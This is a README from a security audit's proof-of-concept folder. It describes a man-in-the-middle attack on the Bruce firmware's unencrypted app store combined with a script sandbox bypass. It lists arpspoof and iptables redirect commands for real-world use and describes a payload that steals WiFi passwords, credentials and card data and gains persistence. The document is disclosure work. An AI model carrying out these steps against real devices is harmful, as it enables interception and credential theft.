# Proof-of-Concept: Bruce Firmware Attack Chain

This directory contains working demonstrations of the attack chain described in
[`FORENSIC_AUDIT.md`](../../FORENSIC_AUDIT.md) — combining **AV-001 (plain HTTP App Store)** with
**AV-003 (MJS sandbox bypass)**.

## Files

| File | Purpose |
|------|---------|
| [`poc-mitm-proxy.js`](poc-mitm-proxy.js) | Node.js MITM proxy that intercepts App Store HTTP requests and injects a malicious payload |
| [`poc-malicious-payload.js`](poc-malicious-payload.js) | Example malicious MJS payload that exfiltrates credentials and gains persistence |
| [`poc-sandbox-bypass.js`](poc-sandbox-bypass.js) | Standalone Node.js script that simulates the MJS `require()` vulnerability |

## How It Works

```
Normal flow:
  Device ---HTTP---> ghp.iceis.co.uk ---> App Store JS ---> Device executes

MITM flow:
  Device ---HTTP---> [PROXY] ---> (injects malicious payload) ---> Device executes
                          |
                          v
                     Attacker-controlled payload has FULL device access:
                     - Read /bruce.conf (WiFi passwords, API keys)
                     - Read /BruceEvilCreds/ (captured portal creds)
                     - Read /BruceRFID/ (credit card numbers)
                     - Exfiltrate via HTTP POST
                     - Gain persistence by writing startup scripts
                     - Transmit on any RF frequency
                     - Inject keystrokes via BadUSB
```

## Running the PoC

### 1. Sandbox Bypass Demo (no hardware needed)
```bash
node evidence/poc/poc-sandbox-bypass.js
```
Shows that `require()` is a global property lookup with zero permission checks.

### 2. MITM Proxy (demonstrates the attack live)
```bash
# Terminal 1: Start the proxy
node evidence/poc/poc-mitm-proxy.js

# Terminal 2: Test that it intercepts App Store requests
curl -x http://localhost:8080 http://ghp.iceis.co.uk/service/appstore/
# The proxy will intercept and respond with the malicious payload
```

### 3. Real-World Usage
To demonstrate this against an actual Bruce device:
1. ARP-spoof the device's network (e.g., `arpspoof -t <device-ip> <gateway-ip>`)
2. Redirect port 80 traffic to this proxy (e.g., `iptables -t nat -A PREROUTING -p tcp --dport 80 -j REDIRECT --to-port 8080`)
3. When the device refreshes the App Store, it receives the malicious payload
4. The payload executes with **full device privileges** — no sandbox, no prompts

## Why This Works

1. **AV-001 (HTTP App Store)**: The firmware uses `http://ghp.iceis.co.uk/service/appstore/`
   with no TLS, no certificate verification, no integrity checking. Any attacker on the
   same WiFi, the ISP, or anywhere on the route can intercept and modify the response.

2. **AV-003 (Sandbox Bypass)**: The MJS `require()` function in `globals_js.cpp` performs
   a simple global property lookup with no whitelist, no permission check, no sandbox
   of any kind. See [`TRACEABILITY_MATRIX.md`](../../TRACEABILITY_MATRIX.md) for exact source lines.

## Source References

- AV-001: [bruce-firmware/core/settings.cpp:1712](bruce-firmware/core/settings.cpp#L1712)
- AV-003: [bruce-firmware/modules/bjs_interpreter/globals_js.cpp:28-56](bruce-firmware/modules/bjs_interpreter/globals_js.cpp#L28-L56)
